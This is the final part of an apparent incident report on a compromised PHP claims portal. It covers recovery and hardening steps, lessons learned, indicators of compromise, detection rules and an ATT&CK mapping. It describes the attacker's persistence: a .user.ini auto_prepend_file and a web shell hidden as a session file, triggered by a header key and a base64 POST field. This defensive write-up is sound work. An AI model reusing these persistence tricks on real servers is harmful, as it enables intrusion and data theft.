*Recovery.* Rotate every secret in `.env`: the MariaDB password of `claims_app`, the S3 access key and secret key, `APPRAISAL_TOKEN` and `APP_KEY`; review MariaDB and S3 access logs for their use from 03:44 onwards. Give the code back to root, leaving `www-data` write access only where the application writes:

```bash
sudo chown -R root:www-data /var/www/claims
sudo find /var/www/claims -type d -exec chmod 0750 {} +
sudo find /var/www/claims -type f -exec chmod 0640 {} +
sudo chown -R www-data:www-data /var/www/claims/public/uploads /var/www/claims/storage
```

Deny dotfiles in nginx, inside the uploads block as well, because a `^~` prefix location stops nginx from checking regular-expression locations for those URIs:

```nginx
location ~ /\.(?!well-known/) { deny all; }
location ^~ /uploads/ {
    location ~ /\. { deny all; }
    location ~ \.php$ { return 403; }
}
```

Consider disabling per-directory INI files altogether with `user_ini.filename =` (empty) in `/etc/php/8.4/fpm/php.ini`; the portal does not use them. Remove the `deny 198.51.100.73;` line from `/etc/nginx/conf.d/blocklist.conf`, run `sudo nginx -t` and `sudo systemctl reload nginx`, and ask the appraisal firm to resend the three refused reports. Treat the dump as a personal data breach: scope the tables it could contain and notify the supervisory authority and the customers as required.

*Lessons learned.*

- Patch critical internet-facing vulnerabilities in hours, not days. An `apt-mark hold` without an owner and an expiry date silently blocks security updates, even with unattended-upgrades installed.
- Hunt backwards from the first public reports of exploitation (17 October), not from the disclosure date, across every rotated log.
- Keep permanent detections: PHP fatal `Allowed memory size ... in Unknown on line 0`; bursts of `exited on signal 11 (SIGSEGV)` in the FPM master log and `segfault` in `kern.log`; POST requests to GET-only pages; requests without a usable `Content-Length` but with megabytes received; hidden files requested under `uploads/`.
- Never block a client on the strength of one crash. A crash belongs to the worker's history, which only the pool access log (`pid=`) shows.
- Normalise heterogeneous logs to common field names (`grokit --unify`, OCSF) before an incident, so that time, IP and PID joins across sources take minutes, not hours.

### 9. Key IoCs and detections for the SOC fleet

| Type | Indicator | Notes |
|------|-----------|-------|
| IPv4 | `203.0.113.47` | Exploitation sequences 1, 4, 7, 10 and reconnaissance (02:18:38–02:19:00) |
| IPv4 | `203.0.113.61` | Exploitation sequences 2, 5, 8, 11 |
| IPv4 | `203.0.113.88` | Exploitation sequences 3, 6, 9 and the successful sequence 12 (worker 4127, 03:07:39) |
| IPv4 | `203.0.113.201` | Backdoor use and download of the database dump |
| Path | `/var/www/claims/public/.user.ini` | Persistence: `auto_prepend_file` in the document root (95 bytes) |
| SHA-256 | `1685eef7c87909a575b62c9dab1764987bec20f3b8672f486b8e4283a56a27f2` | `.user.ini` |
| Path | `/var/lib/php/sessions/sess_9f2c4e1a7b3d5c8e0a6f2b9d4c1e7a3f` | PHP backdoor disguised as a session file (164 bytes) |
| SHA-256 | `ba17f2045e9a63c7b5304ddeeb2257f74a794e681a6f83698079bf45fefa112e` | Backdoor payload |
| HTTP header | `X-Claim-Ref: 89292cbca1564d5a9652c3873d479ec1` | Backdoor trigger key; payload code in POST field `d` (base64) |
| URL | `https://claims.halvane.example/claims/status.php` | Backdoor trigger used: POST to a GET-only page (any PHP URL on the site would work) |
| File name | `.tmp_5e1b9c.sql.gz` | Database dump in `/var/www/claims/public/uploads/incoming/`, 48213077 bytes, downloaded with `curl/8.5.0`, then deleted |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0` | Shared by the three exploitation IPs (common string: use only in combination) |

**Detections to deploy**, phrased against the field names used above:

- PHP error log: `metadata_log_level = Fatal error`, `status_detail` starting with `Allowed memory size of`, `file_path = Unknown`, `file_line = 0`.
- PHP-FPM master log: more than one `exited on signal 11 (SIGSEGV)` per pool in an hour; kernel log: `segfault` in a `php-fpm*` process, especially repeated at the same `instruction_pointer` across PIDs.
- nginx access log: a 500 on a multipart POST followed within seconds by a 502 from the same `src_endpoint_ip`; `http_request_content_length` empty with a `http_request_length` of megabytes (the format logs `$http_content_length`; adding `$http_transfer_encoding` would name the chunked encoding explicitly); any non-GET method on `/claims/status.php`; any request for a path containing `/.` under `/uploads/`.
- Pool access log: a request on a GET-only page lasting seconds instead of milliseconds; `process_memory_peak_kb` equal to `memory_limit` on a request answered 200.
- File integrity: any `.user.ini` or `auto_prepend_file`/`auto_append_file` directive appearing under a web root; any file under `/var/lib/php/sessions` whose content starts with `<?php`.

**MITRE ATT&CK mapping.** T1190 (Exploit Public-Facing Application); T1505.003 (Server Software Component: Web Shell); T1036.005 (Masquerading: Match Legitimate Name or Location); T1564.001 (Hide Artifacts: Hidden Files and Directories); T1552.001 (Unsecured Credentials: Credentials In Files); T1213.006 (Data from Information Repositories: Databases); T1560.002 (Archive Collected Data: Archive via Library); T1041 (Exfiltration Over C2 Channel); T1070.004 (Indicator Removal: File Deletion). Primary tactics: **Initial Access** (T1190) and **Persistence** (T1505.003).

**References.** [CISA alert, 21 October 2026](https://www.cisa.gov/news-events/alerts/2026/10/21/critical-vulnerabilities-php-require-immediate-patching) · [Rapid7](https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php/) · [Red Hat CVE-2026-109618](https://access.redhat.com/security/cve/cve-2026-109618) · [Tenable FAQ](https://www.tenable.com/blog/php2shell-cve-2026-109618-cve-2026-109619-frequently-asked-questions-about-critical-php-remote) · [Amazon Threat Intelligence (MadPot)](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/) · [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/) · [Graylog detection guide](https://graylog.org/post/detecting-php2shell-cves-with-graylog/) · [Blevene detection notes](https://gist.github.com/Blevene/472692937d05145d29d17dc3c6edc2a0) · [Abstract Security](https://www.abstract.security/blog/php2shell-critical-php-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619) · [Sansec](https://sansec.io/research/php2shell) · [The DFIR Report](https://thedfirreport.com/2025/05/19/another-confluence-bites-the-dust-falling-to-elpaco-team-ransomware/) · [MITRE T1190](https://attack.mitre.org/techniques/T1190/) · [MITRE T1505.003](https://attack.mitre.org/techniques/T1505/003/) · [CyberSleuth-GrokIT](https://github.com/ablescia/CyberSleuth-GrokIT)
